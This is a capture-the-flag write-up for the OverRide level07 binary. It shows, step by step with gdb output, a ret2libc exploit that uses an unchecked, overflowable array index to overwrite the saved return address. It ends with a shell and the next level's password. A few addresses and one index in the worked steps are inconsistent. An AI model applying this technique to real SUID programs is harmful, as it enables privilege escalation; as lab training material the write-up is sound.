# Level 7

## Vulnerability

Ret2Libc Attack on Unprotected Data Array

## Context

We find a binary with owner ```level08``` and SUID.
```
level07@OverRide:~$ ls -l
-rwsr-s---+ 1 level08 users 11744 Sep 10  2016 level07
```

The program takes a number and index as input, which it stores or reads from a table.
```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 42
 Index: 1
 Completed store command successfully
Input command: read
 Index: 1
 Number at data[1] is 42
 Completed read command successfully
Input command: store
 Number: -42
 Index: 2
 Completed store command successfully
```

## Solution

### main() overview

See [dissasembly notes](https://github.com/anyashuka/Override/blob/main/level07/Ressources/disassembly_notes.md) for detailed gdb assembly breakdown.

We can see the program erases arguments and environment variables, thus protecting against:
- passing malicious shellcode as arguments to the program
- storing malicious shellcode in environment variables

We also know the following:
- the program creates a data table, where it stores numbers at indexes
- some indexes (index % 3 == 0) are protected

Vulnerability: no check is performed on indexes and an unsigned int table is stored on the stack. This means we can read and store in stack memory. 


### Build exploit

Our plan is to do a ret2libc attack, by overwriting the index containing EIP with a call to ```system()``` + ```exit()``` + ```"/bin/sh"```. 

1) find the address of system, exit, bin/sh
2) calculate the 'index' of EIP
3) use maxint overflow to access protected indexes
4) run exploit by inputting malicious number + index to running program

**step 1**
```
level07@OverRide:~$ gdb -q level07

(gdb) b*main
Breakpoint 1 at 0x8048723
(gdb) run
[...]

(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>

(gdb) find &system,+9999999,"/bin/sh"
0xf7f897ec
warning: Unable to access target memory at 0xf7fd3b74, halting search.
1 pattern found.
(gdb) x/s 0xf7f897ec
0xf7f897ec:	 "/bin/sh"
```
Ok, here are our addresses:

- ```system()``` is at ```0xf7e6aed0```
- ```exit()``` is at ```0xf7e5eb70```
- ```"/bin/sh"``` is at ```0xf7f897ec```

<br />
**step 2** <br />
We need to find the index in the table where we reach EIP, and then store our payload there using ```store_number()```. 

The table's address is ```0xffffd4f4```.
```
(gdb) b*store_number+6
(gdb) r
[...]
Input command: store

(gdb) p $ebp+0x8
$1 = (void *) 0xffffd4d0  # int *data
(gdb) x/a 0xffffd4d0
0xffffd4d0:	0xffffd4f4  # data[0]
```

EIP's return address in the ```main()``` function is ```0xffffd6bc```.
```
(gdb) info frame
Stack level 0, frame at 0xffffd6c0:
 eip = 0x8048723 in main; saved eip 0xf7e45513
 Arglist at unknown address.
 Locals at unknown address, Previous frame's sp is 0xffffd6c0
 Saved registers:
  eip at 0xffffd6bc
```

**Step 3** <br />
Next, we need to calculate the 'index' of our EIP address. 
```
  0xffffd63c   -    0xffffd474    =    int(0x1c8)  =   456
[eip_address]     [table_address]                    [bytes]

456 / 4   =   114
          [index in table]

114 % 3 = 0
```
Ah... index 114 is protected: ```114 % 3 = 0```. We can't store a number at this index. 

On lines 152-158 of the disassembled binary, we see that the table is accessed as ```data[index * 4]```. 
Since the index is an unsigned int and multiplied by 4, we can overflow uintmax to give the index where we want to go. 
```
0x100000000 = 2^32
[size of uintmax]

(2^32 / 4) + 114 = 1073741938
                  [index 114, after overflow]

1073741938 % 3 = 1
```
Index ```1073741938``` is unprotected! 

Let's test it out by causing the program to segfault. 
```
(gdb) run

Input command: store
 Number: 1094795585   # decimal for 0x41414141 or 'AAAA'
 Index: 1073741938    # index 114
 Completed store command successfully
Input command: quit

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```

**Step 4** <br />
Let's structure our exploit:
```
[ address of EIP ] = [ address of system ] [ address of exit ] [ address of "/bin/sh" ]
   0xffffd6bc           0xf7e6aed0           0xf7e5eb70             0xf7f897ec          # address
                        4159090384           4159040368             4160264172          # in decimal, to be number input
                            |                     |                     |
                        1073741938           115                    115                 # index to use
                        data[114]            data[115]              data[116]   
```

Let's give it a go!

```
level07@OverRide:~$ ./level07
----------------------------------------------------
  Welcome to wil's crappy number storage service!
----------------------------------------------------
 Commands:
    store - store a number into the data storage
    read  - read a number from the data storage
    quit  - exit the program
----------------------------------------------------
   wil has reserved some storage :>
----------------------------------------------------

Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4159040368
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
